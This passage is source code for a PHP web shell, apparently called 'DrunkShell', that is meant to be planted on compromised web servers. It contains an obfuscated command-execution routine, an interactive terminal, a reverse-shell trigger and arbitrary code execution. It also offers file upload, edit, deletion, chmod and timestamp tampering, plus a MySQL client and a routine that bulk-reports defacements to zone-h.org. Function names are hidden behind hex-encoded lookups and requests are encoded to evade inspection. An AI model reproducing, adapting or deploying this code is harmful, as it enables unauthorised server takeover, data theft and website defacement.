                  <div style="margin-bottom:10px;"><input type="text" name="upload-path" value="%s" style="width:100%%" /></div>
                  <input name="upnya[]" id="uploader" type=\'file\' multiple="multiple"/>
                  <input style="float:right" type="submit" name="upload" value=">>" />
                </form>
                </td>
              </tr>
            </table>
          </div>',$at,$at);
        if(isset($_POST["cr8folder"])){
          $name=$_POST["foldername"];
          $handler=$WKWK[40]($name, 0777);
          if($handler){
            Status("Status", "Folder created!!");
            header("Location:".$_SERVER["REQUEST_URI"]);
          }else{
            Status("Status", "Can't create folder :(");
            header("Location:".$_SERVER["REQUEST_URI"]);
          }
        }
        if(isset($_POST["upload"])){
          $upath=$_POST["upload-path"];
          $indexs=count($_FILES["upnya"]["name"]);
          $err = 0;
          for ($i=0; $i < $indexs; $i++) { 
            $tmp = $_FILES["upnya"]["tmp_name"][$i];
            if(!empty($tmp)){
              $uplodpath=$upath."/".$_FILES["upnya"]["name"][$i];
              if(!$WKWK[43]($tmp, $uplodpath)) $err++;
            }
          }
          if($err == 0){
            Status("Msg", "Files Uploaded");
            header("Location:".$_SERVER["REQUEST_URI"]);
          }else{
            Status("Msg", "Can't Upload Files");
            header("Location:".$_SERVER["REQUEST_URI"]);
          }
        }
        if(isset($_POST["cr8file"])){
          $filename=$_POST["filename"];
          $handler = $WKWK[12]($filename, "w");
          if(!$handler){
            Status("Status", "Can't create file :(");
            header("Location:".$_SERVER["REQUEST_URI"]);
          }else{
            $WKWK[14]($handler);
            header("Location:?x=".Enx($at)."&y=".Enx($filename)."&act=edit");
          }
        }
        if (isset($_POST["read"])){
          $path  = $_POST["path"];
          header("Location:?x=".Enx($WKWK[57]($path)."/")."&y=".Enx($WKWK[0]($path))."&act=read");
        }
        if (isset($_POST["cdir"])){
          $path  = $_POST["goto"];
          if (!$WKWK[18]("/\\\|\//", substr($path, -1))) {
            $path  = $_POST["goto"]."/";
          }
          header("Location: ?x=".Enx($path));
        }
}
function featureMysql(){
  global $WKWK, $at, $conn;
  Title("MySQL");
	 if(@empty($_SESSION["mysql"])){
      echo '
      <form autocomplete=\'off\' class="featureForm" method="post">
        <table class="feature-tbl">
          <tr>
            <td>server</td>
            <td>:</td>
            <td>
              <input type="text" name="server" value="localhost">
            </td>
          </tr>
          <tr>
            <td>port</td>
            <td>:</td>
            <td>
              <input type="text" name="port" value="">
            </td>
          </tr>
          <tr>
            <td>user</td>
            <td>:</td>
            <td>
              <input type="text" name="username" value="">
            </td>
          </tr>
          <tr>
            <td>database</td>
            <td>:</td>
            <td>
              <input type="text" name="database" value="">
            </td>
          </tr>
          <tr>
            <td>pw</td>
            <td>:</td>
            <td>
              <input type="text" name="pwd" value="">
            </td>
          </tr>
          <tr>
            <td></td><td></td>
            <td>
              <input type="submit" name="connect" value="CONNECT!">
            </td>
          </tr>
        </table>
      </form>';
      if(isset($_POST["connect"])){
        $server=$_POST["server"];
        $uname=$_POST["username"];
        $pwd=$_POST["pwd"];
        $port=(empty($_POST["port"])) ? "3306" : $_POST["port"];
        $database=$_POST["database"];
        $testconn = new mysqli($server.":".$port, $uname, $pwd, $database);
        if($testconn->connect_errno){
          echo "Cant connect :(";
        }else{
          $_SESSION["mysql"]["server"]=$server.":".$port;
          $_SESSION["mysql"]["username"]=$uname;
          $_SESSION["mysql"]["pwd"]=$pwd;
          $_SESSION["mysql"]["database"]=$database;
          echo "CONNECTED";
          header("Location: ?f=mysql");
        }
      }
    }else{
	 echo '
      <div class="righty">
            <div class="row">
              <div class="col-auto">
                Databases
              </div>
            </div>
            <div class="row">
              <div class="col-auto">';
                if(isset($_POST["dbses"])){
                  $_SESSION["mysql"]["database"] = AjaxDec($_POST["dbses"]);
                  header("Location:".$_SERVER['REQUEST_URI']);
                }
                $res = $conn->query("show databases;");
                while ($row = $res->fetch_assoc()) {
                  echo "<a class='mr dbses curpo bor' style='padding:6px 8px' data-val='".$row["Database"]."'>";
                  if($row["Database"] == @$_SESSION["mysql"]["database"]){
                    echo "<span style='color:#32ff6a'>".$row["Database"]."</span>";
                  }else{
                    echo $row["Database"];
                  }
                  echo "</a>";
                }
              echo '
              </div>
            </div>
            <div class="row">
              <div class="col-auto">
                <textarea id="query" >
show databases;
show tables;
select * from [database].[table];
				</textarea>
                <form method="post">
                  <input type="submit" id="submitQuery" value="execute!">
                  <input type="submit" name="out" value="logout">
                </form>
              </div>
            </div>
            <div class="row">
              <div class="col-auto">
                <div id="mysqlOutput">
                </div>
              </div>
            </div>
      </div>';
      if (isset($_POST["out"])) {
        unset($_SESSION["mysql"]["server"]);
        unset($_SESSION["mysql"]["username"]);
        unset($_SESSION["mysql"]["pwd"]);
        unset($_SESSION["mysql"]["database"]);
        header("Location: ?f=mysql");
      }
    }
}
function Action($act){
global $WKWK, $at;
    switch ($act) {
      case 'touch':
        printf('
        <table class="act">
          %s
          <tr>
            <td>
              <form autocomplete="off" method="post">
                  <input type="text" name="time" value="%s">
                  <input type="submit" name="touch" value="TOUCH">
              </form>
            </td>
          </tr>
        </table>', HeaderAction($at, Dex($_GET["y"])),lastmod($at.Dex($_GET["y"]))
        );
        if(isset($_POST["touch"])){
          if(Sentuh($at.Dex($_GET["y"]),$_POST["time"])){
            Status("Status", "File Touched!!!");
            header("Location:".$_SERVER['REQUEST_URI']);
          }else{
            Status("Status", "Something Wrong?!?!?!");
            header("Location:".$_SERVER['REQUEST_URI']);
          }
        }
      break;
      case 'chmod':
      printf('
      <table class="act">
        %s
        <tr>
          <td>
            <form autocomplete=\'off\'  method="post">
              <input type="text" name="perm" value="%s">
              <input type="submit" name="changemod" value="EXECUTE!">
            </form>
          </td>
        </tr>
      </table>', HeaderAction($at, Dex($_GET["y"])),substr(sprintf('%o', $WKWK[17]($at.Dex($_GET["y"]))),-4)
      );
      if(isset($_POST["changemod"])){
        if($WKWK[7]($at.Dex($_GET["y"]),Perm($_POST["perm"]))){
            Status("Status", "Wow chmod success!!!");
            header("Location:".$_SERVER['REQUEST_URI']);
        }else{
            Status("Status", "Failed to chmod :(");
            header("Location:".$_SERVER['REQUEST_URI']);
        }
      }
    break;
    case 'del':
      if (isset($_GET["y"])) {
        $msg = Delete($at.Dex($_GET["y"]));
          Status("Status", $msg);
          header("Location:".$_SERVER["PHP_SELF"]."?x=".Enx($at));
      }
    break;
    case 'edit':
      printf('
      <table class="act">
        %s
        <tr>
          <td>
            <form autocomplete="off" method="post">
              <input type="hidden" id="path-edit" value="%s">
              <textarea name="content" id="content-edit" style="height:400px">%s</textarea>
              <input type="submit" name="edit" id="save" value="SAVE!">
              <span id="msg-edit"></span>
            </form>
          </td>
        </tr>
      </table>', HeaderAction($at, Dex($_GET["y"])),$at.Dex($_GET["y"]),Read($at.Dex($_GET["y"])));
    break;
    case 'rename':
      printf('
      <table class="act">
        %s
        <tr>
          <td>
            <form autocomplete=\'off\' method="post">
              <input type="text" name="rname" value="%s">
              <input type="submit" name="rename" value="GO!">
            </form>
          </td>
        </tr>
      </table>', HeaderAction($at, Dex($_GET["y"])),Dex($_GET["y"]));
      if(isset($_POST["rename"])){
        if($WKWK[42]($at.Dex($_GET["y"]), $at.$_POST["rname"])){
          Status("Status", "Success rename a file/folder");
          header("Location:".$_SERVER["PHP_SELF"]."?x=".Enx($at)."&y=".Enx($_POST["rname"])."&act=".$_GET["act"]);
        }else{
          Status("Status", "Can't rename a file/folder");
          header("Location:".$_SERVER['REQUEST_URI']);
        }
      }
    break;
    case 'read':
      printf('
      <table class="act">
        %s
        <tr>
          <td>
            <form autocomplete=\'off\' method="post">
              <textarea style="height:400px" readonly>%s</textarea>
            </form>
          </td>
        </tr>
      </table>', HeaderAction($at, Dex($_GET["y"])), Read($at.Dex($_GET["y"])));
    break;
    default:
    echo "404 :p";
    break;
  }
}
function Footer(){
  ?>
  </body>
<script>
const B64EN = (content) => {
  return btoa(unescape(encodeURIComponent(content)));
}
const B64DE = (content) => {
  return atob(unescape(encodeURIComponent(content)));
}
const ROT13 = (str) => {
  var input     = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  var output    = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm';
  var index     = x => input.indexOf(x);
  var translate = x => index(x) > -1 ? output[index(x)] : x;
  return str.split('').map(translate).join('');
}
const Tohex = (x) =>
  {
	var y = [];
	for (var n = 0, l = x.length; n < l; n ++)
     {
		var hex = Number(x.charCodeAt(n)).toString(16);
		y.push(hex);
	 }
	return y.join('');
   }
const Hexto = (x) =>  {
	var hex  = x.toString();
	var x = '';
	for (var n = 0; n < hex.length; n += 2) {
		x += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
	return x;
 }
const URLEN = (str) => {
  return encodeURIComponent(str).replace(/[!'()*]/g, function(c) {
    return '%' + c.charCodeAt(0).toString(16);
  });
}
const URLDE = (str) => {
  return decodeURIComponent(str);
}
const ENCXDE = (x) =>{
  return B64EN(Tohex(x));
}
console.log(ENCXDE("test"));
$("#reverse").click((e) => {
  e.preventDefault()
  var ipPort = $("#ipport").val()
  var lang = $("#lang").val()
  $.ajax({
    method: "POST",
    url: "?api=bc",
    data: {ipport:ENCXDE(ipPort), lang:ENCXDE(lang)}
  }) .done(function( data ) {
    $("#bc-msg").html(data["msg"])
  });
})
$("#submitQuery").click((e) => {
  e.preventDefault()
  var query = $("#query").val()
  $.ajax({
    method: "POST",
    url: "?api=mysql",
    data: {query:ENCXDE(query)}
  }) .done(function( data ) {
    $("#mysqlOutput").html(data["msg"]+data["html"])
  });
})
$("#hashthat").click((e) => {
  e.preventDefault()
  var algo = $("#algos").val()
  var txt = $("#unhash-text").val()
  $.ajax({
    method: "POST",
    url: "?api=hash",
    data: {y:algo, x:txt}
  }) .done(function( data ) {
    $("#hash-output").html("Hash Algo : "+data["algo"]+"<br>Plain Text : "+escape(txt)+"<br>Hashed Text : "+data["result"])
  });
})
$("#convert").click(function(e){
  var lib = $("#encode-decode-lib").val();
  switch(lib){
    case 'b64':
        switch($("#encode-decode").val()){
          case "encode":
            $("#output-text").val(B64EN($("#input-text").val()))
          break;
          case "decode":
            $("#output-text").val(B64DE($("#input-text").val()))
          break;
        }
    break;
    case 'hex':
        switch($("#encode-decode").val()){
          case "encode":
            var val = $("#input-text").val();
            $("#output-text").val(Tohex(val))
          break;
          case "decode":
            $("#output-text").val(Hexto($("#input-text").val()))
          break;
        }
    break;
    case 'url':
        switch($("#encode-decode").val()){
          case "encode":
            $("#output-text").val(URLEN($("#input-text").val()))
          break;
          case "decode":
            $("#output-text").val(URLDE($("#input-text").val()))
          break;
        }
    break;
    case 'rot13':
        switch($("#encode-decode").val()){
          case "encode":
            $("#output-text").val(ROT13($("#input-text").val()))
          break;
          case "decode":
            $("#output-text").val(ROT13($("#input-text").val()))
          break;
        }
    break;
    default:
      $(".open").hide()
    break;
  }
})
$('.btn').click(function() {
  $(".runcode").addClass('hidden-tab');
  $(".btn").removeClass('active');
  $(this).addClass('active');
  $($(this).data('goto')).removeClass('hidden-tab');
});
$('#exec').click(function(e) {
  e.preventDefault();
  var code = $("#code").val()
  var lang = $(".lang-select").val()
  $("#runcode-output").html("Executing the code....")
  $.ajax({
    method: "POST",
    url: "?api=execode",
    data: {code: ENCXDE(code), lang:ENCXDE(lang)}
  }) .done(function( data ) {
    $("#runcode-output").html(data["output"])
  });
});
$("#save").click((e)=>{
  e.preventDefault()
  var something = $("#content-edit").val()
  var content = ENCXDE(something)
  var pathy = $("#path-edit").val()
  $("#msg-edit").html("Saving... Please Wait..")
  $.ajax({
    method: "POST",
    url: "?api=edit",
    data: {content: content, path:ENCXDE(pathy)}
  }) .done(function( data ) {
    $("#msg-edit").html(data["msg"])
  });

})
$("#search").click((e) => {
  e.preventDefault();
  var file = $("#searchbox").val()
  var paths = $("#path").val()
  $("#checkedF").html("<img width='70px' id='loading' src='https://upload.wikimedia.org/wikipedia/commons/a/ad/YouTube_loading_symbol_3_%28transparent%29.gif'>");
  $.ajax({
    method: "POST",
    url: "?api=search",
    data: { searchfile: ENCXDE(file), path: ENCXDE(paths)}
  }) .done(function( data ) {
    $("#checkedF").html(data["data"])
    $(".actSubmit").click(function(e) {
    e.preventDefault()
    var select = $(this).siblings();
    var value = $(select).val()
    var customParam = $(select).data("param");
    var filename = $(select).data("filename")
    switch(customParam){
      case "goto":
        window.location.href = value;
      break;
      case "copy":
        $.redirectPost('', {'path_dir': value,'act': 'copy'});
      break;
      case "delete":
        if(confirm(`Want to delete > ${filename} ??`)) window.location.href = value;
      break;
      case "move":
        $.redirectPost('', {'path_dir': value,'act': 'move'});
      break;
      case "pastef":
        $.redirectPost('', {'path': value+'/','act': 'pastef'});
      break;
      case "download":
        $.redirectPost('?api=dwnld', {'fullpath': ENCXDE(value)});
      break;
    }
  })
  });
})
$(".blackout").hide();
$("#terminal-show").click(() => {
  $(".blackout").show();
  $("body").css({"overflow":"hidden"});
})
$("#clear").click(() => {
  $("#output").html("");
})
$("#hide").click(() => {
  $("body").css({"overflow":"visible"});
  $(".blackout").hide();
})
let path = null;
var regex = /\\|\//;
const input = () => {
  pathHTML = path.split(regex).join("/")
  $("#input_cmdnya").html("<span class='term-prompt'>DrunkShell(<b style='color:red'>"+pathHTML+"</b>)</span> > ");
}
const output = (np, cmd, path) => {
  pathHTML = path.split(regex).join("/")
  html = $("#output").html();
  html = html + "<span class='term-prompt'>DrunkShell(<b style='color:red'>"+pathHTML+"</b>)</span> > "+escape(cmd)+"<br>"+np;
  $("#output").html(html);
  $("#input_cmdnya").html("<span class='term-prompt'>"+pathHTML+"</span> > ");
}
const newpath = (np) => {
  if(np){
    path = np;
    input()
  }else{
    $.ajax({
      method: "POST",
      url: "?api=path",
    }) .done(function( data ) {
      path = data["path"];
      input()
      console.log(path);
    });
  }
}
$("#cmd").keypress((e)=>{
  if(e.keyCode == 13){
    e.preventDefault()
    var cmdOriginal = $("#cmd").val();
    var pathEncoded = ENCXDE(path)
    var cmd = cmdOriginal.split("").join("awkawk#$!kwowkoako&^%@#@#$%%%!@akusukakamuhehehe>");
    $.ajax({
      method: "POST",
      url: "?api=terminal",
      data: { cmd: ENCXDE(cmd), path: pathEncoded}
    }) .done(function( data ) {
      output(data["output"], cmdOriginal, path);
      $("#terminal-wrapper").animate({
        scrollTop: document.getElementById("output").scrollHeight
      }, 500);
      newpath(data["path"]);
  });
  $("#cmd").val("");
  }
})
newpath();
$.extend(
{
    redirectPost: function(location, args)
    {
        var form = $('<form></form>');
        form.attr("method", "post");
        form.attr("action", location);

        $.each( args, function( key, value ) {
            var field = $('<input></input>');

            field.attr("type", "hidden");
            field.attr("name", key);
            field.attr("value", value);

            form.append(field);
        });
        $(form).appendTo('body').submit();
    }
});
const escape = (unsafe) => {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
 }
  $("#submitAct").click(function(e) {
    e.preventDefault(); // or make the button type=button
    	$.ajax({
        type: "POST",
        data: $('#checkedF').serialize() + "&" + $('#actionForm').serialize(),
        success: function(data){
          location.reload();
        }
      });
  });
$("#spam").click((e) => {
    e.preventDefault();
    var targetarray = $("#urls").val().split("\n");
    var notifier = $("#orang").val();
    $.each(targetarray, function(i, target){
       $.ajax({
         method: "POST",
         url: "http://zone-h.org/notify/single",
         data: { defacer: notifier, domain1: target, hackmode:"1", reason:"1" }
       })
       if (targetarray.length == i+1) {
         $("#msg").html("Done!")
       }else{
         $("#msg").html("<img width='70px' src='https://upload.wikimedia.org/wikipedia/commons/a/ad/YouTube_loading_symbol_3_%28transparent%29.gif'>")
       }
    });
})
  $("#upload").click(() => {
    $("#uploader").click()
    $("#uploader").change(() => {
      $("#post-upload").submit();
    });
  })
  $(".dbses").click(function(e) {
    e.preventDefault()
    var value = $(this).data("val")
    $.redirectPost('', {'dbses': ENCXDE(value)});
  })
  $(".actSubmit").click(function(e) {
    e.preventDefault()
    var select = $(this).siblings().children("option:selected");
    var value = $(select).val()
    var customParam = $(select).data("param")
    var filename = $(select).data("filename")
    switch(customParam){
      case "goto":
        window.location.href = value;
      break;
      case "copy":
        $.redirectPost('', {'path_dir': value,'act': 'copy'});
      break;
      case "delete":
        if(confirm(`Want to delete > ${filename} ??`)) window.location.href = value;
      break;
      case "move":
        $.redirectPost('', {'path_dir': value,'act': 'move'});
      break;
      case "pastef":
        $.redirectPost('', {'path': value+'/','act': 'pastef'});
      break;
      case "download":
        $.redirectPost('?api=dwnld', {'fullpath': ENCXDE(value)});
      break;
    }
  })
  $("#mass").hide();
  $("#massbutt").click(() => {
    $("#mass").toggle();
  })
  $("#tools").hide();
  $("#toolsbutt").click(() => {
    $("#tools").toggle();
  })
</script>
</html>
  <?php
}
function OG($path)
{
  global $WKWK;
  if(function_exists('posix_getgrgid')){
    $group = $WKWK[35]($WKWK[56]($path));
    $group = $group['name'];
  }else{
    $group = "?";
  }
  if(function_exists('posix_getpwuid')){
    $owner = $WKWK[36]($WKWK[38]($path));
    $owner = $owner['name'];
  }else{
    $owner = "?";
  }
  return $owner.":".$group;
}
function Delete($path)
{
  global $WKWK;
    if($WKWK[28]($path."/")){
      if(Delfolder($path."/")){
        return $path." ==> DELETED!";
      }else{
        return $path." ==> FAILED!";
      }
    }else{
      if($WKWK[5]($path)){
        return $path." ==> DELETED!";
      }else{
        return $path." ==> FAILED!";
      }
    }
}
function Xute($payload)
{
  global $WKWK;
    if (isset($payload))
    {
        if (function_exists(Dex("6b36626e6a475274")))
        {
            @ob_start();
            @$WKWK[3]($payload);
            $content = @ob_get_contents();
            @ob_end_clean();
            return $content;
        }
        elseif (function_exists(Dex("6b3766626c4770684e5066624f713d3d")))
        {
            $content = @$WKWK[2]($payload);
            return $content;
        }
        elseif (function_exists(Dex("4e5066624f713d3d")))
        {
            @ob_start();
            @$WKWK[1]($payload, $output);
            foreach ($output as $o)
            {
                $content = $content . $o;
            }
            $content = @ob_get_contents();
            @ob_end_clean();
            return $content;
        }
        elseif (function_exists(Dex("6b47486e6b3656796b7a533d")))
        {
            @ob_start();
            @$WKWK[4]($payload);
            @ob_end_clean();
            $content = @ob_get_contents();
            return $content;
        }	elseif(function_exists(Dex("6b4730714e51353d")))
        {
        		$buff="";
        		$pop=$WKWK[46]($payload,"r");
        		while(!$WKWK[48]($pop))
        		{
        			$buff.=$WKWK[49]($pop,1024);
        		}
        		$WKWK[47]($pop);
        		return $buff;
        }
        else
        {
            return false;
        }
    }
}
function MSG(){
  if($_SERVER['REQUEST_METHOD'] != "POST"){
    if(!empty($_SESSION["msg"]["title"]) && !empty($_SESSION["msg"]["content"])){
      echo '
      <div class="box bg-yellow">
        <table>
          <tr>
            <td>'.$_SESSION["msg"]["title"].'</td>
            <td>:</td>
            <td>'.$_SESSION["msg"]["content"].'</td>
          </tr>
        </table>
      </div>';
      unset($_SESSION["msg"]);
    }
  }
}
function text($text, $mode)
{
    if ($mode == "success") return "<span style='color:#32ff6a'>" . $text . "</span>";
    if ($mode == "successb") return "<span class='b sb'>" . $text . "</span>";
    if ($mode == "fail") return "<span style='color:red'>" . $text . "</span>";
    if ($mode == "failb") return "<span class='b fb'>" . $text . "</span>";
    if ($mode == "warn") return "<span style='color:yellow'>" . $text . "</span>";
    if ($mode == "warnb") return "<span class='b wb'>" . $text . "</span>";
}
function lastmod($file)
{
    global $WKWK;
    $time = $WKWK[50]($file);
    $time = $WKWK[51]("Y-m-d H:i:s", $time);
    return $time;
  }
function PermColor($path, $color = "colored"){
  global $WKWK;
  $textperm = PermText($path);
  $output = "";
  if($WKWK[52]($path)) {
    if($color == "colored"){
      $output = text($textperm."<span class='b wb'>READABLE</span><span class='b wb'>".PermNumber($path)."</span>", "warn");
    }else{
      $output = $textperm."<span class='b bw'>READABLE</span><span class='b bw'>".PermNumber($path)."</span>";
    }
  }
  if($WKWK[53]($path)){
    if($color == "colored"){
      $output = text($textperm."<span class='b sb'>WRITABLE</span><span class='b sb'>".PermNumber($path)."</span>", "success");
    }else{
      $output = $textperm."<span class='b bw'>WRITABLE</span><span class='b bw'>".PermNumber($path)."</span>";
    }
  }
  if(!$WKWK[53]($path) && !$WKWK[52]($path)){
    if($color == "colored"){
      $output = text($textperm."<span class='b fb'>ACCESS DENIED</span><span class='b fb'>".PermNumber($path)."</span>", "fail");
    }else{
      $output = $textperm."<span class='b bw'>ACCESS DENIED</span><span class='b bw'>".PermNumber($path)."</span>";
    }
  }
  return $output;
}
function PermText($path){
  global $WKWK;
  $perms = $WKWK[17]($path);

  switch ($perms & 0xF000) {
      case 0xC000:
          $info = 's';
          break;
      case 0xA000:
          $info = 'l';
          break;
      case 0x6000:
          $info = 'b';
          break;
      case 0x8000:
          $info = '-';
          break;
      case 0x4000:
          $info = 'd';
          break;
      case 0x2000:
          $info = 'c';
          break;
      case 0x1000:
          $info = 'p';
          break;
      default:
          $info = 'u';
  }
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

  return $info;
}
function PermNumber($path){
  global $WKWK;
  $perms = substr(sprintf('%o', $WKWK[17]($path)),-4);
  return $perms;
}
function Perm($perm){
  global $WKWK;
  $lolol = $perm;
  $perms = 0;
  for($i=strlen($perm)-1;$i>=0;--$i) $perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
  return $perms;
}
function write($pathfile, $content)
{
  global $WKWK;
  $handler = $WKWK[12]($pathfile, 'w');
  if($WKWK[13]($handler, $content)){
  return true;
  }else{
  return false;
  }
 $WKWK[14]($handler);
}

function Delfolder($_path){
  global $WKWK;
  $path = $WKWK[19]("\\", "/", $_path);
  $contain = $WKWK[8]($path);
  $file_html = "";
  foreach($contain as $key => $file){
      $p = realpath($path.DIRECTORY_SEPARATOR.$file);
      if ($WKWK[28]($p)) {
        if($file == "." || $file == ".."){
          continue;
        }
        Delfolder($p);
      }else{
        $WKWK[5]($p);
      }
    }
  if($WKWK[6]($path)){
    return true;
  }else{
    return false;
  }
}
function Status($title, $content){
  $_SESSION["msg"]["title"] = $title;
  $_SESSION["msg"]["content"] = $content;
}
?>
